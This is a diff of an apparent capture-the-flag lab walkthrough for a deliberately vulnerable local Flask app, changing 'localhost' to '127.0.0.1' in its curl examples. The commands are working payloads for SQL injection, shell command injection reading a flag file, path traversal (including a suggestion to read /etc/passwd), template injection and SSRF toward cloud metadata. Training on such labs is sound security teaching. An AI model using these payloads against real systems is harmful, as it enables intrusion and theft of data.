@@ -12,7 +12,7 @@ Have [SINKS.md](SINKS.md) open in another tab.
 Don't read the code yet. Look at the attack surface.
 
 ```bash
-curl -s http://localhost:5000/
+curl -s http://127.0.0.1:5000/
 ```
 
 Six routes, each takes a query param. Six potential **sources**. Write them down:
@@ -178,13 +178,13 @@ after you've done at least one by hand.
 Probe: does a quote break it?
 
 ```bash
-curl -s "http://localhost:5000/user?id=1'"
+curl -s "http://127.0.0.1:5000/user?id=1'"
 ```
 
 500 error → the quote reached SQL. Now extract something:
 
 ```bash
-curl -s "http://localhost:5000/user?id=1%20UNION%20SELECT%20id,name,value%20FROM%20secrets"
+curl -s "http://127.0.0.1:5000/user?id=1%20UNION%20SELECT%20id,name,value%20FROM%20secrets"
 ```
 
 You should see `FLAG{sqli_union_select_works}`. **Pwned.**
@@ -192,7 +192,7 @@ You should see `FLAG{sqli_union_select_works}`. **Pwned.**
 Now try the same against the decoy:
 
 ```bash
-curl -s "http://localhost:5000/order?id=1%20UNION%20SELECT%201,2,3"
+curl -s "http://127.0.0.1:5000/order?id=1%20UNION%20SELECT%201,2,3"
 ```
 
 500 from `int()`. Candidate dead. This is what a sanitizer looks like from the outside: a
@@ -203,19 +203,19 @@ crash or a clean answer, never your payload.
 Probe:
 
 ```bash
-curl -s "http://localhost:5000/ping?host=127.0.0.1%3Bid"
+curl -s "http://127.0.0.1:5000/ping?host=127.0.0.1%3Bid"
 ```
 
 Output of `id` after the ping → shell metachar survived. Escalate:
 
 ```bash
-curl -s "http://localhost:5000/ping?host=127.0.0.1%3Bcat%20/app/secret/flag.txt"
+curl -s "http://127.0.0.1:5000/ping?host=127.0.0.1%3Bcat%20/app/secret/flag.txt"
 ```
 
 ### Flow 3: Path traversal
 
 ```bash
-curl -s "http://localhost:5000/docs?name=..%2F..%2Fsecret%2Fflag.txt"
+curl -s "http://127.0.0.1:5000/docs?name=..%2F..%2Fsecret%2Fflag.txt"
 ```
 
 `DOCS_DIR` is `/app/flask_app/docs`. Two `..` gets you to `/app`. Try `/etc/passwd` too.
@@ -225,7 +225,7 @@ curl -s "http://localhost:5000/docs?name=..%2F..%2Fsecret%2Fflag.txt"
 Probe. If it renders `49`, the template engine evaluated your input:
 
 ```bash
-curl -s "http://localhost:5000/hello?name={{7*7}}"
+curl -s "http://127.0.0.1:5000/hello?name={{7*7}}"
 ```
 
 Jinja2 can reach the host language from a template. Escalating to code execution is your
@@ -239,7 +239,7 @@ directly. From the host you talk to `:5000`; inside the container the app listen
 and only the app can reach that:
 
 ```bash
-curl -s "http://localhost:5000/fetch?url=http://127.0.0.1:5000/user?id=2"
+curl -s "http://127.0.0.1:5000/fetch?url=http://127.0.0.1:5000/user?id=2"
 ```
 
 In the real world this is cloud metadata (`http://169.254.169.254/`), internal admin panels,
